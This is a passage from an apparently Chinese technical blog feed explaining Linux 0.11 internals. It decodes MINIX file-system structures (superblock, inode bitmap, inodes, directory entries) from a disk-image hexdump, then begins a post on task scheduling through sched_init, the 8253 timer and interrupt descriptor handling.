单文件的最大长度 */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">short</span> s_magic;            <span class="comment">/* 文件系统的魔数 */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* 下面的内容是在内存中使用的，并不会在磁盘上进行读写 */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">s_imap</span>[8];</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">s_zmap</span>[8];</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">short</span> s_dev;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">s_isup</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">s_imount</span>;</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> s_time;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">s_wait</span>;</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> s_lock;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> s_rd_only;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> s_dirt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>结合着 <code>disk.img</code> 的数据来看看。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000400  c0 00 00 02 01 00 01 00  0a 00 00 00 00 1c 08 10  |................|</span><br><span class="line">00000410  8f 13 01 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line"></span><br><span class="line">0x00c0  -&gt; 192 个 i 节点</span><br><span class="line">0x0200  -&gt; 512 个逻辑块</span><br><span class="line">0x0001  -&gt; 一个i节点位图</span><br><span class="line">0x0001  -&gt; 一个逻辑块位图</span><br><span class="line">0x000a  -&gt; 第一个数据块编号为 10 </span><br><span class="line">0x0000  -&gt; log2(磁盘块大小 / 逻辑块大小) = 0 ，即磁盘块大小 = 逻辑块大小 = 1024 B</span><br><span class="line">0x10081c00 -&gt; 单文件最大 268966912 B</span><br></pre></td></tr></table></figure><p><strong>inode 位图</strong></p><p>inode 位图的数据比较简单，是通过设置比特位 0、1 的方式，来直接表明相应编号的 i 节点是否存在。<br>默认 i 节点从 1 号开始编号，0 号节点在 inode 位图上一定设置为 1 </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000800  07 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00000810  00 00 00 00 00 00 00 00  fe ff ff ff ff ff ff ff  |................|</span><br><span class="line">00000820  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br></pre></td></tr></table></figure><p>总共 192 个 i 节点，加上 0 号节点总计需占用 193 位 ( = 193 / 8 = 24 字节 + 1 位)</p><p>其余多余的位，全部置位为 1 。</p><p>位图存储的最初数据 0x07 (注意，小端存储法) = 0b111</p><p>由此，总共有1号和2号i节点。</p><p><strong>逻辑块位图</strong></p><p>类似的，逻辑块位图是为了表明第n个逻辑块存储有数据，或处于空闲状态。</p><p><strong>inode 区块</strong></p><p>参照前面讲过的字典目录的形式，inode 就是一种分级编排后的目录。</p><p>当然，说目录可能还会引发误解。这里无论是对于操作系统下的目录或是文件，每一个都对应着一个独特的 inode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">d_inode</span> &#123;</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">short</span> i_mode;     <span class="comment">/* 文件类型和属性 (rwx 位) */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">short</span> i_uid;      <span class="comment">/* 文件所有者 id */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> i_size;      <span class="comment">/* 文件大小 */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> i_time;      <span class="comment">/* 修改时间 */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> i_gid;       <span class="comment">/* 文件所在组 id */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> i_nlinks;    <span class="comment">/* 有多少个链接数 (有多少个文件目录项指向该 i 节点) */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">short</span> i_zone[<span class="number">9</span>];  <span class="comment">/* 文件数据所占用数据盘的指针 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>每个i节点的数据分别 32 字节</p><p>同样的，结合 <code>disk.img</code> 的数据来看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00001000  ed 41 00 00 60 00 00 00  e5 0d d4 5b 00 02 0a 00  |.A..`......[....|</span><br><span class="line">00001010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00001020  a4 81 00 00 13 00 00 00  e5 0d d4 5b 00 01 0b 00  |...........[....|</span><br><span class="line">00001030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line"></span><br><span class="line">0x41ed  -&gt; </span><br><span class="line">0x0000  -&gt;  文件所有者为 0 即 root</span><br><span class="line">0x00000060  -&gt;  文件大小为 96 B</span><br><span class="line">0x5bd40de5  -&gt;  文件最后修改时间为 Unix TimeStamp 1540623845 =&gt; 2018/10/27 15:4:5</span><br><span class="line">0x00    -&gt;  文件所在组 id</span><br><span class="line">0x02    -&gt;  有两个文件目录项指向1号i节点</span><br><span class="line">0x000a  -&gt;  1 号 i 节点指向的第0块数据为第10个逻辑块(即第1个数据块)</span><br><span class="line">0x0000  =&gt;  由于数据比较小，后面的 i_zone[1] ~ i_zone[8] 均为 0</span><br></pre></td></tr></table></figure><p>i_zone 指向的是数据实际存储的数据块的位置。</p><p>但是，仅仅只有 9 个指针，每个数据块能存储 1024 B ，是远远达不到之前所描述的单文件 <code>0x10081c00 = 268966912 B</code> 的上限的。</p><p>事实上，minix 在实际处理的过程中，把前7个指针作为直接数据块指针，最多存储 7168 B 数据。</p><p>i_zone[7] 表示一次间接指针，指向某一个数据块，但是该数据块每2字节作为一个指针，指向真正的数据块。</p><p>i_zone[8] 表示二次间接指针。</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fwnu3zrwuij310y0m6abj.jpg" alt=""><br><small>Copied from Linux 内核完全注释V3.0</small></p><p><strong>数据块</strong></p><p>最后，我们看看数据块的内容，也希望能够更好地来理解 Linux 目录和文件的异同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00002800  01 00 2e 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00002810  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00002820  01 00 2e 2e 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00002830  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00002840  02 00 68 65 6c 6c 6f 2e  63 00 00 00 00 00 00 00  |..hello.c.......|</span><br><span class="line">00002850  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00002c00  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include &lt;stdio.|</span><br><span class="line">00002c10  68 3e 0a 00 00 00 00 00  00 00 00 00 00 00 00 00  |h&gt;..............|</span><br><span class="line">00002c20  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br></pre></td></tr></table></figure><p>在i节点区块上，我们看到有1号i节点和2号i节点已经被使用了。</p><p>0x2800 ~ 0x2860 的位置表示的就是 1 号i节点的数据。事实上这是一个目录(当然，怎么区分目录还是文件，在i节点区块的 i_mode 字段已经描述过了)</p><p>对于目录文件，当然是用来记载目录项的，每个目录项占用 32 字节。</p><blockquote><p>这里需要进行说明，MINIX 1.0 版本的文件系统似乎是对每个目录项占用 16 字节的。</p><p>这里提供一个 Linux 0.11 版本的仿真运行结果以供证明<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fwnuexcwx7j30nw0c8745.jpg" alt=""></p><p>上面描述的 <code>disk.img</code> 是在 Ubuntu 16.04 LTS 下跑出来的结果，所有确实出现了一些差别。<br>至于具体的一个规范，目前还没有找到，所有这部分只能做模糊处理了，勿怪。</p></blockquote><p>前2个字节用来表示该目录项所对应的 i 节点编号。之后的30个字节用来描述该目录项的名字。</p><p>因此，对 0x2800 ~ 0x2860 的数据进行重建的结果就是 <code>. .. hello.c</code> 三个目录项了。其中，由于是根目录，<code>.</code> 和 <code>..</code> 所指向的i节点的相同的，都是1号i节点。</p><p>而 hello.c 文件指向的是 2 号i节点。</p><p>哈哈，2号i节点的数据内容就在 0x2c00 开始的位置。通过右侧的 ASCII 结果我们也可以看到。</p><p>当然，之前说过每个数据块是 1024 B ，那么数据块多余的部分，就是留空咯，而不会被其它i节点占用(除非该文件or目录被完全移除了)</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>到此为止，文件系统宏观的描述就已经完结了。</p><p>下一节将对操作系统如何使用文件系统进行描述。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用惯了类 Unix 系统，应该说文件系统是日常最常接触的一个操作系统模块之一了。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; ls&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Applications Network      Users        bin          data         etc          net          sbin         usr&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Library      System       Volumes      cores        dev          home         private      tmp          var&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是，究竟什么是文件系统? 为什么需要文件系统? 难道文件不是简单地存储到存储设备一块连续区域的吗?&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://DorMOUSE-None.github.io/tags/Linux/"/>
    
      <category term="Kernel" scheme="https://DorMOUSE-None.github.io/tags/Kernel/"/>
    
      <category term="File System" scheme="https://DorMOUSE-None.github.io/tags/File-System/"/>
    
  </entry>
  
  <entry>
    <title>理解 Linux Kernel (4) - 任务调度</title>
    <link href="https://DorMOUSE-None.github.io/2018-10-12-understand-Kernel-4/"/>
    <id>https://DorMOUSE-None.github.io/2018-10-12-understand-Kernel-4/</id>
    <published>2018-10-12T01:36:23.239Z</published>
    <updated>2018-10-13T02:22:59.351Z</updated>
    
    <content type="html"><![CDATA[<p>前面几节已经描述过，对于单核 CPU 来说。CPU 就处于不断地执行指令的过程(或者通过 <code>hlt</code> 指令直接停止工作)。</p><p>针对于每一个程序来说，这个程序执行流程是通过 CPU 中几组寄存器(通用寄存器、段寄存器、控制寄存器等) 和存储在内存中的代码和数据协作完成的。</p><p>如果要达到单核多任务的目的，首先要做的就是完成对几组寄存器中当前值的保存(我称之为保存现场)。而对于内存来说，多个任务的代码、数据同时存在内存是完全合理且可行的。毕竟相较于有限的寄存器，内存实在是太大了(相对而言)。</p><a id="more"></a><h2 id="任务调度的宏观描述"><a href="#任务调度的宏观描述" class="headerlink" title="任务调度的宏观描述"></a>任务调度的宏观描述</h2><p>从宏观上来说，操作系统维护了若干个任务(假设有 0, 1, 5, 6)。</p><p>下面以一个假象的例子来对任务调度做一些形象的说明:</p><ol><li><p>假设当前任务是任务 5 ，操作系统分配给它的 CPU 使用时间是 30ms。</p></li><li><p>每 10ms 计时器(Intel 8253, 可编程计数器/定时器) 向 CPU 发起一个时钟中断。</p></li><li><p>CPU 开始处理时钟中断(此时是<strong>内核态</strong>)。当前任务剩余可用时间 -10ms。</p></li><li><p>检查当前任务的剩余时间片，有剩余 -&gt; 步骤 5 ; 否则 -&gt; 步骤 6 </p></li><li><p>直接退出对时钟中断的处理函数(回到 <strong>用户态</strong>), 重复步骤 1 </p></li><li><p>根据每个任务的优先级及其它一些因素确定把接下来的一段时间分配给哪个任务。(假设分配给任务 6 ，30ms 的 CPU 使用时间) -&gt; 重复步骤 2 。</p></li></ol><p>当然，上面的描述中忽略了很多的因素。</p><h2 id="任务调度准备阶段"><a href="#任务调度准备阶段" class="headerlink" title="任务调度准备阶段"></a>任务调度准备阶段</h2><p>这里都将以 Linux 0.11 版本代码作为实例。当然，其中一些代码为了适应现在的 GCC 做了一些修改，另外还可能直接摆出 GCC 编译后的汇编代码来解释说明。</p><p>首先，内核代码在经过一系列的准备流程(包括设置一些寄存器以及在内存中暂存某些值，读取计算机的硬件配置等)。真正开始出现任务 0 始于下列这段代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 来自 Linux0.11 init/main.c */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">sched_init();       <span class="comment">/* schedule, 顾名思义就是时间安排咯 */</span></span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">sti();</span><br><span class="line">move_to_user_mode();</span><br><span class="line"><span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">init();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(;;) pause();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在操作系统的主函数中，开始对任务调度进行一定的准备工作。看看具体代码吧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 这里给出的是 Linux0.11 kernel/sched.c 经过预编译的函数(里面有一些内联汇编) */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sched_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> * <span class="title">p</span>;</span>    <span class="comment">/* 声明一个描述符指针 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">sizeof</span>(struct sigaction) != <span class="number">16</span>)</span><br><span class="line">        panic(<span class="string">"Struct sigaction MUST be 16 bytes"</span>);</span><br><span class="line">    __asm__ (                           <span class="comment">/* 这段是为了设置全局描述符表GDT的第4项，是一个 0 号任务(当前任务)的任务调用门*/</span></span><br><span class="line">            <span class="string">"movw $104,%1\n\t"</span> </span><br><span class="line">            <span class="string">"movw %%ax,%2\n\t"</span> </span><br><span class="line">            <span class="string">"rorl $16,%%eax\n\t"</span> </span><br><span class="line">            <span class="string">"movb %%al,%3\n\t"</span> </span><br><span class="line">            <span class="string">"movb $"</span> <span class="string">"0x89"</span> <span class="string">",%4\n\t"</span> </span><br><span class="line">            <span class="string">"movb $0x00,%5\n\t"</span> </span><br><span class="line">            <span class="string">"movb %%ah,%6\n\t"</span> </span><br><span class="line">            <span class="string">"rorl $16,%%eax"</span> </span><br><span class="line">            ::<span class="string">"a"</span> (&amp;(init_task.task.tss)), <span class="string">"m"</span> (*(((<span class="keyword">char</span> *) (gdt+<span class="number">4</span>)))), <span class="string">"m"</span> (*(((<span class="keyword">char</span> *) (gdt+<span class="number">4</span>))+<span class="number">2</span>)), <span class="string">"m"</span> (*(((<span class="keyword">char</span> *) (gdt+<span class="number">4</span>))+<span class="number">4</span>)), <span class="string">"m"</span> (*(((<span class="keyword">char</span> *) (gdt+<span class="number">4</span>))+<span class="number">5</span>)), <span class="string">"m"</span> (*(((<span class="keyword">char</span> *) (gdt+<span class="number">4</span>))+<span class="number">6</span>)), <span class="string">"m"</span> (*(((<span class="keyword">char</span> *) (gdt+<span class="number">4</span>))+<span class="number">7</span>)) </span><br><span class="line">            );</span><br><span class="line">    __asm__ (                           <span class="comment">/* 这里设置全局描述符表的第5项，0号任务的局部描述符表基址选择符 */</span></span><br><span class="line">            <span class="string">"movw $104,%1\n\t"</span> </span><br><span class="line">            <span class="string">"movw %%ax,%2\n\t"</span> </span><br><span class="line">            <span class="string">"rorl $16,%%eax\n\t"</span> </span><br><span class="line">            <span class="string">"movb %%al,%3\n\t"</span> </span><br><span class="line">            <span class="string">"movb $"</span> <span class="string">"0x82"</span> <span class="string">",%4\n\t"</span> </span><br><span class="line">            <span class="string">"movb $0x00,%5\n\t"</span> </span><br><span class="line">            <span class="string">"movb %%ah,%6\n\t"</span> </span><br><span class="line">            <span class="string">"rorl $16,%%eax"</span> </span><br><span class="line">            ::<span class="string">"a"</span> (&amp;(init_task.task.ldt)), <span class="string">"m"</span> (*(((<span class="keyword">char</span> *) (gdt+(<span class="number">4</span> +<span class="number">1</span>))))), <span class="string">"m"</span> (*(((<span class="keyword">char</span> *) (gdt+(<span class="number">4</span> +<span class="number">1</span>)))+<span class="number">2</span>)), <span class="string">"m"</span> (*(((<span class="keyword">char</span> *) (gdt+(<span class="number">4</span> +<span class="number">1</span>)))+<span class="number">4</span>)), <span class="string">"m"</span> (*(((<span class="keyword">char</span> *) (gdt+(<span class="number">4</span> +<span class="number">1</span>)))+<span class="number">5</span>)), <span class="string">"m"</span> (*(((<span class="keyword">char</span> *) (gdt+(<span class="number">4</span> +<span class="number">1</span>)))+<span class="number">6</span>)), <span class="string">"m"</span> (*(((<span class="keyword">char</span> *) (gdt+(<span class="number">4</span> +<span class="number">1</span>)))+<span class="number">7</span>)) </span><br><span class="line">            );</span><br><span class="line">    p = gdt+<span class="number">2</span>+<span class="number">4</span>;        <span class="comment">/* 描述符指针指向 GDT 第6项。因为前面已经占用了第4，5项。由内核占用了 0，1，2，3。*/</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">64</span>;i++) &#123;         <span class="comment">/* 循环 63 次，这是 Linux0.11 最大支持 64 个任务同时存在。当前任务已经占了一个任务了*/</span></span><br><span class="line">        task[i] = ((<span class="keyword">void</span> *) <span class="number">0</span>); <span class="comment">/* 63个任务指针全部值为 NULL */</span></span><br><span class="line">        p-&gt;a=p-&gt;b=<span class="number">0</span>;            <span class="comment">/* GDT 累积 126 项(126 * 8 字节)全部置为 0 。每个任务占用 GDT 两项，一为任务门，一为局部描述符表选择符*/</span></span><br><span class="line">        p++;</span><br><span class="line">        p-&gt;a=p-&gt;b=<span class="number">0</span>;</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __asm__(<span class="string">"pushfl ; andl $0xffffbfff,(%esp) ; popfl"</span>);</span><br><span class="line">    __asm__(<span class="string">"ltr %%ax"</span>::<span class="string">"a"</span> (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="number">0</span>)&lt;&lt;<span class="number">4</span>)+(<span class="number">4</span>&lt;&lt;<span class="number">3</span>))));           <span class="comment">/* load Task Register TR 记录当前任务门为 gdt 第4项 */</span></span><br><span class="line">    __asm__(<span class="string">"lldt %%ax"</span>::<span class="string">"a"</span> (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="number">0</span>)&lt;&lt;<span class="number">4</span>)+((<span class="number">4</span> +<span class="number">1</span>)&lt;&lt;<span class="number">3</span>))));     <span class="comment">/* load Local Descriptor Table Register LDTR 记录当前选择符为 gdt 第5项 */</span></span><br><span class="line">    <span class="comment">/* 给8253芯片编程，每 10ms 发起一次时钟中断(下面3行的工作) */</span></span><br><span class="line">    __asm__ (<span class="string">"outb %%al,%%dx\n"</span> <span class="string">"\tjmp 1f\n"</span> <span class="string">"1:\tjmp 1f\n"</span> <span class="string">"1:"</span>::<span class="string">"a"</span> (<span class="number">0x36</span>),<span class="string">"d"</span> (<span class="number">0x43</span>));   </span><br><span class="line">    __asm__ (<span class="string">"outb %%al,%%dx\n"</span> <span class="string">"\tjmp 1f\n"</span> <span class="string">"1:\tjmp 1f\n"</span> <span class="string">"1:"</span>::<span class="string">"a"</span> ((<span class="number">1193180</span>/<span class="number">100</span>) &amp; <span class="number">0xff</span>),<span class="string">"d"</span> (<span class="number">0x40</span>));</span><br><span class="line">    __asm__ (<span class="string">"outb %%al,%%dx"</span>::<span class="string">"a"</span> ((<span class="number">1193180</span>/<span class="number">100</span>) &gt;&gt; <span class="number">8</span>),<span class="string">"d"</span> (<span class="number">0x40</span>));</span><br><span class="line">    __asm__ (<span class="string">"movw %%dx,%%ax\n\t"</span> <span class="string">"movw %0,%%dx\n\t"</span> <span class="string">"movl %%eax,%1\n\t"</span> <span class="string">"movl %%edx,%2"</span> : : <span class="string">"i"</span> ((<span class="keyword">short</span>) (<span class="number">0x8000</span>+(<span class="number">0</span>&lt;&lt;<span class="number">13</span>)+(<span class="number">14</span>&lt;&lt;<span class="number">8</span>))), <span class="string">"o"</span> (*((<span class="keyword">char</span> *) (&amp;idt[<span class="number">0x20</span>]))), <span class="string">"o"</span> (*(<span class="number">4</span>+(<span class="keyword">char</span> *) (&amp;idt[<span class="number">0x20</span>]))), <span class="string">"d"</span> ((<span class="keyword">char</span> *) (&amp;timer_interrupt)),<span class="string">"a"</span> (<span class="number">0x00080000</span>)); <span class="comment">/* 在 IDT 中设置时钟中断描述符项，第32项为时钟中断*/</span></span><br><span class="line">    __asm__ (<span class="string">"outb %%al,%%dx"</span>::<span class="string">"a"</span> ((&#123; <span class="keyword">unsigned</span> <span class="keyword">char</span> _v; __asm__ <span class="keyword">volatile</span> (<span class="string">"inb %%dx,%%al\n"</span> <span class="string">"\tjmp 1f\n"</span> <span class="string">"1:\tjmp 1f\n"</span> <span class="string">"1:"</span>:<span class="string">"=a"</span> (_v):<span class="string">"d"</span> (<span class="number">0x21</span>)); _v; &#125;)&amp;~<span class="number">0x01</span>),<span class="string">"d"</span> (<span class="number">0x21</span>)); <span class="comment">/*重新设置时钟中断的可屏蔽属性，这样就可在调用 hlt 后被时钟中断唤醒 */</span></span><br><span class="line">    __asm__ (<span class="string">"movw %%dx,%%ax\n\t"</span> <span class="string">"movw %0,%%dx\n\t"</span> <span class="string">"movl %%eax,%1\n\t"</span> <span class="string">"movl %%edx,%2"</span> : : <span class="string">"i"</span> ((<span class="keyword">short</span>) (<span class="number">0x8000</span>+(<span class="number">3</span>&lt;&lt;<span class="number">13</span>)+(<span class="number">15</span>&lt;&lt;<span class="number">8</span>))), <span class="string">"o"</span> (*((<span class="keyword">char</span> *) (&amp;idt[<span class="number">0x80</span>]))), <span class="string">"o"</span> (*(<span class="number">4</span>+(<span class="keyword">char</span> *) (&amp;idt[<span class="number">0x80</span>]))), <span class="string">"d"</span> ((<span class="keyword">char</span> *) (&amp;system_call)),<span class="string">"a"</span> (<span class="number">0x00080000</span>)); <span class="comment">/* 在 IDT 中设置系统中断，第128项为时钟中断 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过执行 <code>sched_init()</code> ，操作系统开始有了任务的概念。并且把当前任务作为任务 0 来加以认识。</p><p>同时，预置了 64 个任务状态数组，用来辅助任务调度器完成未来调度任务时确认目前所有任务的基础性支持。</p><p>最重要的，当然是对 8253 芯片的编程，使其每 10ms 向 CPU 发起一个硬件时钟中断。由此将把系统暂时性的带入<strong>内核态</strong> 来完成 CPU 下一个 10ms 需要进行的任务的决策工作。</p><p>最后的设置时钟中断描述符和系统中断描述符自不用说。不设置的话，对于接收到的中断根本就没办法确认处理中断的代码在哪(毕竟中断处理逻辑也是由 CPU 执行指令来解决的)</p><h2 id="任务调度实施阶段"><a href="#任务调度实施阶段" class="headerlink" title="任务调度实施阶段"></a>任务调度实施阶段</h2><p>由于时钟中断是由硬件芯片进行控制，根本不会顾及当前 CPU 正在执行的任务已经执行到了哪个指令 (哈哈，这不得是当然的嘛，不然要任务调度做什么，所有任务流水线作业得了)。</p><p>因此，下面的描述将借着一次时钟中断，来看一下整一个任务调度操作。</p><h3 id="定位时钟中断处理逻辑"><a href="#定位时钟中断处理逻辑" class="headerlink" title="定位时钟中断处理逻辑"></a>定位时钟中断处理逻辑</h3><p>Intel 8253芯片发起时钟中断之后，CPU 立即开始处理该中断</p><ol><li><p>通过 IDTR 芯片查找中断描述符表(IDT, 最多256项，每项8字节) 的基址。</p></li><li><p>结合中断号作为偏移量，定位表中某一项具体的中断描述符 (时钟中断是0x20，因此偏移就是 0x20 * 8 = 256)</p></li></ol><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fw51zkvo2nj313q0mm3z3.jpg" alt=""><br><small>Copied from Intel® 64 and IA-32 Architectures Software Developer’s Manual</small></p><ol start="3"><li>每一个中断描述符项都将是任务门，中断门，陷阱门三类中的一类，其所占用的 8 字节数据将按如下的形式进行存储</li></ol><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fw527o8903j314614ita0.jpg" alt=""><br><small>Copied from Intel® 64 and IA-32 Architectures Software Developer’s Manual</small></p><ol start="4"><li>时钟中断是一种中断门，可以看到低 0~15 位和高 48~63 位共同组成了段内偏移量，而低16~31位组成了一个段选择符(可以去 GDT 找到相应的段)。</li></ol><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fw52a4jbe0j31440zeq3j.jpg" alt=""><br><small>Copied from Intel® 64 and IA-32 Architectures Software Developer’s Manual</small></p><ol start="5"><li>至此，我们就可以定位到处理时钟中断的代码究竟在呢。之后也就是普通的 CPU 继续执行指令的过程(当然，需要注意，这个时候需要注意当前段选择符所表示的 DPL=0 ，即已经进入了内核态)</li></ol><h3 id="模板式的保存现场-timer-interrupt"><a href="#模板式的保存现场-timer-interrupt" class="headerlink" title="模板式的保存现场 timer_interrupt"></a>模板式的保存现场 timer_interrupt</h3><p>在上一小节第 5 步定位时钟中断的代码时，由于发生了特权级的切换，因此中断处理流程会自动地在新的栈(这里指处理时钟中断使用的内核栈)中保存原来任务的信息，依次入新栈的数据有原任务的 SS, ESP, 